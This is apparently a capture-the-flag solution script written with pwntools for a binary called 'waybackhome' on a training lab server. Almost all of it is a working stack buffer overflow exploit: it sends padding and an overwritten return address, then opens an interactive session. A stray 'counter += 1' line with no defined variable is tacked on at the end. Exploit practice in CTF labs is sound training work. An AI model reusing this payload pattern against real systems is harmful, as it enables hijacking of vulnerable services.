from pwn import *

# r = process('/media/sf_D_DRIVE/waybackhome')
r = remote('lab.scist.org', 33361)

r.sendline((b'A') * 0x20 + (b'A') * 8 + p64(0x40117B))
r.interactive()
counter += 1
